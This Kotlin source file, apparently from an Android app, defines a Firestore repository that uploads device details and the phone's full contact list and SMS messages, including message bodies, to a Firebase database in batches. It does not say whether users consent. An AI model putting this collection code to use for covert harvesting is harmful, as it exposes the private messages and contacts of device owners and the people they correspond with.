package com.datasync.user.data

import com.datasync.user.model.Contact
import com.datasync.user.model.DeviceInfo
import com.datasync.user.model.SMS
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.WriteBatch
import kotlinx.coroutines.tasks.await
import java.security.MessageDigest

class FirestoreRepository {
    private val db = FirebaseFirestore.getInstance()

    suspend fun updateDeviceInfo(deviceInfo: DeviceInfo) {
        db.collection("devices")
            .document(deviceInfo.deviceId)
            .set(deviceInfo)
            .await()
    }

    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("contacts")

        // Use batch writes for scalability
        val chunks = contacts.chunked(500)
        for (chunk in chunks) {
            val batch = db.batch()
            chunk.forEach { contact ->
                // Use hashed phone number as ID to prevent duplicates
                val docId = hashString(contact.phone)
                val docRef = collectionRef.document(docId)
                batch.set(docRef, contact)
            }
            batch.commit().await()
        }
    }

    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("sms")

        val chunks = smsList.chunked(500)
        for (chunk in chunks) {
            val batch = db.batch()
            chunk.forEach { sms ->
                // Use hash of address + date + body as ID to prevent duplicates
                val docId = hashString("${sms.address}${sms.date}${sms.body}")
                val docRef = collectionRef.document(docId)
                batch.set(docRef, sms)
            }
            batch.commit().await()
        }
    }

    private fun hashString(input: String): String {
        return MessageDigest.getInstance("SHA-256")
            .digest(input.toByteArray())
            .joinToString("") { "%02x".format(it) }
    }
}
